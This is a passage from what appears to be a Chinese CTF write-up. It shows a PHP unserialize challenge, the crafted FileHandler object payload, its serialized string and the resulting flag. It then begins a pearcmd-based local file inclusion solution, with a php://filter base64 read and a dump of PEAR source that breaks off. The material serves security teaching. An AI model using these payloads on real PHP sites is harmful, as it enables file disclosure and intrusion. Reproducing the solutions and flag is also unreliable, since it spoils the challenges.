class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fuck1&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fuck again&quot;</span>;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag1.php&quot;</span>);<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;3&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>查看代码：</p><blockquote><ul><li><p><code>is_valid()</code>确保输入的<code>$s</code>的字符ASCII需要在32-125间，如果用<code>protected</code>序列化会产生<code>/0/0</code>不可见字符，不满足要求，所以使用<code>public</code></p></li><li><p>反序列化时不会调用<code>__construct()</code>，但在类即将摧毁时，会调用<code>__destruct()</code>，即调用<code>process()</code>函数</p></li><li><p>在<code>process()</code>中只有<code>op=2</code>时，才能读<code>flag.php</code></p></li></ul><p>所以写payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;2&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span> =<span class="hljs-string">&quot;wHy 1S YuAnsHen&quot;</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到：</p><p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:1:&quot;2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:15:&quot;wHy 1S YuAnsHen&quot;;&#125;</code></p></blockquote><p><em><strong><center><font color="#81ecec" size="5">viking{BUNmH4MHP3dZf9mkdesj}</font></center></strong></em></p><h2 id="听说你会LFI"><a href="#听说你会LFI" class="headerlink" title="听说你会LFI"></a>听说你会LFI</h2><p>提示<code>./phpinfo.php</code></p><p><img src="/posts/29460/image-20231026125819460.png" alt="image-20231026125819460"></p><p>网上搜到使用<code>pearcmd</code>的解法<a href="https://blog.csdn.net/Mrs_H/article/details/122386511">利用pearcmd.php本地文件包含（LFI）-CSDN博客</a></p><blockquote><p>在此之前我们需要确定几件事情：</p><p>1.我们要找到<code>pearcmd.php</code>的文件位置。正常情况下在<code>/usr/local/lib/php/pearcmd.php</code></p><p>2.我们要开启<code>register_argc_argv</code>选项，当然了docker的PHP镜像是默认开启的。</p><p>当我们开启register_argc_argv选项的时候，$_SERVER[‘argv’]就会生效。</p></blockquote><p>访问<code>?file=php://filter/read=convert.base64-encode/resource=/usr/local/lib/php/pearcmd.php</code></p><p>解码可以得到</p><details>    <summary><strong>点击查看</strong></summary><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * PEAR, the PHP Extension and Application Repository</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Command line interface</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * PHP versions 4 and 5</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@category</span>  pear</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@package</span>   PEAR</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>    Stig Bakken &lt;ssb<span class="hljs-doctag">@php</span>.net&gt;</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>    Tomas V.V.Cox &lt;cox<span class="hljs-doctag">@idecnet</span>.com&gt;</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@copyright</span> 1997-2009 The Authors</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@license</span>   http://opensource.org/licenses/bsd-license.php New BSD License</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@link</span>      http://pear.php.net/package/PEAR</span><br><span class="hljs-comment"> */</span><br><br>@<span class="hljs-title function_ invoke__">ob_end_clean</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">defined</span>(<span class="hljs-string">&#x27;PEAR_RUNTYPE&#x27;</span>)) &#123;<br>    <span class="hljs-comment">// this is defined in peclcmd.php as &#x27;pecl&#x27;</span><br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;PEAR_RUNTYPE&#x27;</span>, <span class="hljs-string">&#x27;pear&#x27;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;PEAR_IGNORE_BACKTRACE&#x27;</span>, <span class="hljs-number">1</span>);<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@nodep</span> Gtk</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//the space is needed for windows include paths with trailing backslash</span><br><span class="hljs-comment">// http://pear.php.net/bugs/bug.php?id=19482</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;/usr/local/lib/php &#x27;</span> != <span class="hljs-string">&#x27;@&#x27;</span>.<span class="hljs-string">&#x27;include_path&#x27;</span>.<span class="hljs-string">&#x27;@ &#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;include_path&#x27;</span>, <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-string">&#x27;/usr/local/lib/php &#x27;</span>). PATH_SEPARATOR .  <span class="hljs-title function_ invoke__">get_include_path</span>());<br>    <span class="hljs-variable">$raw</span> = <span class="hljs-literal">false</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// this is a raw, uninstalled pear, either a cvs checkout, or php distro</span><br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;include_path&#x27;</span>, <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__DIR__</span>) . PATH_SEPARATOR . <span class="hljs-title function_ invoke__">get_include_path</span>());<br>    <span class="hljs-variable">$raw</span> = <span class="hljs-literal">true</span>;<br>&#125;<br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;allow_url_fopen&#x27;</span>, <span class="hljs-literal">true</span>);<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ob_implicit_flush</span>(<span class="hljs-literal">true</span>);<br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;track_errors&#x27;</span>, <span class="hljs-literal">true</span>);<br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;html_errors&#x27;</span>, <span class="hljs-literal">false</span>);<br><span class="hljs-variable">$_PEAR_PHPDIR</span> = <span class="hljs-string">&#x27;#$%^&amp;*&#x27;</span>;<br><span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&#x27;error_handler&#x27;</span>);<br><br><span class="hljs-variable">$pear_package_version</span> = <span class="hljs-string">&quot;1.10.12&quot;</span>;<br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;PEAR.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;PEAR/Frontend.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;PEAR/Config.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;PEAR/Command.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;Console/Getopt.php&#x27;</span>;<br><br><br><span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">setFrontendType</span>(<span class="hljs-string">&#x27;CLI&#x27;</span>);<br><span class="hljs-variable">$all_commands</span> = <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getCommands</span>();<br><br><span class="hljs-comment">// remove this next part when we stop supporting that crap-ass PHP 4.2</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$HTTP_SERVER_VARS</span>[<span class="hljs-string">&#x27;argv&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;ERROR: either use the CLI php executable, &#x27;</span> .<br>         <span class="hljs-string">&#x27;or set register_argc_argv=On in php.ini&#x27;</span>;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-variable">$argv</span> = <span class="hljs-title class_">Console_Getopt</span>::<span class="hljs-title function_ invoke__">readPHPArgv</span>();<br><span class="hljs-comment">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">php_sapi_name</span>() != <span class="hljs-string">&#x27;cli&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]) &amp;&amp; <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;--&#x27;</span>) &#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-variable">$argv</span> = <span class="hljs-title function_ invoke__">array_values</span>(<span class="hljs-variable">$argv</span>);<br>&#125;<br><span class="hljs-variable">$progname</span> = PEAR_RUNTYPE;<br><span class="hljs-title function_ invoke__">array_shift</span>(<span class="hljs-variable">$argv</span>);<br><span class="hljs-variable">$options</span> = <span class="hljs-title class_">Console_Getopt</span>::<span class="hljs-title function_ invoke__">getopt2</span>(<span class="hljs-variable">$argv</span>, <span class="hljs-string">&quot;c:C:d:D:Gh?sSqu:vV&quot;</span>);<br><span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$options</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">usage</span>(<span 